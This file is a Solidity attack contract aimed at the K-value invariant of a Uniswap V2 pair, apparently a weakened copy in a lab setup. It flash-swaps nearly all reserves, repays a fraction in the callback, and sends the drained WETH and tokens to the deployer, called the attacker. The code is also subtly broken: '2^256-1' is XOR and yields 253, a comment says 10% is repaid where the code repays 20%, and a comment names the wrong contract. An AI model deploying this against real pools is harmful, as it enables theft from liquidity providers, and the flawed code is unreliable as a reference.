// Solidity version declaration, this contract uses Solidity 0.8.0+
pragma solidity ^0.8.0;

// Import Uniswap V2 pair interface   
import {IUniswapV2Pair} from "../contracts/core/interfaces/IUniswapV2Pair.sol";
// Import ERC20 token interface
import {IERC20} from "../contracts/core/interfaces/IERC20.sol";

// Create a new contract called ExploitUniswapV2
contract AttackForKValue {
    // Declare an instance of the Uniswap V2 pair interface
    IUniswapV2Pair uniswapV2Pair;
    // Declare interface instances for operating ERC20 tokens, including WETH and other tokens
    IERC20 weth;
    IERC20 token;
    // Attacker's address
    address public attacker;
    // Address of the Uniswap V2 pair contract
    address public uniswapV2PairAddress;
    // WETH token contract address
    address public wethAddress;
    // Token contract address
    address public tokenAddress;

    // Constructor, pass in Uniswap V2 pair address, WETH address and token address
    constructor(address _uniswapV2Pair, address _weth, address _token) {
        // Initialize each interface and address
        weth = IERC20(_weth);
        token = IERC20(_token);
        uniswapV2Pair = IUniswapV2Pair(_uniswapV2Pair);
        uniswapV2PairAddress = _uniswapV2Pair;
        wethAddress = _weth;
        tokenAddress = _token;
        // Set attacker to contract deployer
        attacker = msg.sender;
        // Approve tokens for attacker and Uniswap V2 pair contract
        weth.approve(attacker, 2^256-1); 
        token.approve(attacker, 2^256-1);
        weth.approve(uniswapV2PairAddress, 2^256-1);
        token.approve(uniswapV2PairAddress, 2^256-1);
    }

    // Start executing attack
    // Attack idea is to directly borrow all using flash loan, repay 10% to exploit
    function exploit() public {
        // Only attacker can trigger this function
        require(msg.sender == attacker, "Not an attacker");
        // Get reserves of Uniswap pair
        (uint reserve0, uint reserve1, uint blocktimestamp) = uniswapV2Pair.getReserves();
        // Execute swap
        uniswapV2Pair.swap(reserve0-1, reserve1-1, address(this), "attack"); 
    }

    // Uniswap V2 callback function, called after trade is done
    function uniswapV2Call(
        address, /* sender */
        uint amount0, 
        uint amount1,
        bytes calldata /* data */
    ) external {
        // Ensure caller is Uniswap V2 pair contract
        require(msg.sender == uniswapV2PairAddress);
        // Calculate amount to return (20% of original here)
        uint returnAmount0 = amount0 * 2 / 10;
        uint returnAmount1 = amount1 * 2 / 10;
        // Check which is WETH in the pair
        address token0InPair = uniswapV2Pair.token0();
        if (token0InPair == wethAddress) {
            // If token0 is WETH, return WETH and token accordingly
            weth.transfer(uniswapV2PairAddress, returnAmount0);
            token.transfer(uniswapV2PairAddress, returnAmount1);
        } else {
            // If token0 is not WETH, return token and WETH instead
            weth.transfer(uniswapV2PairAddress, returnAmount1);
            token.transfer(uniswapV2PairAddress, returnAmount0);
        }
    }
    // Attacker withdraws tokens
    function withdraw() public {
        // Only attacker can trigger this function
        require(msg.sender == attacker);
        // Transfer all WETH and token in this contract to attacker
        weth.transfer(attacker, weth.balanceOf(address(this)));
        token.transfer(attacker, token.balanceOf(address(this)));
    }
}
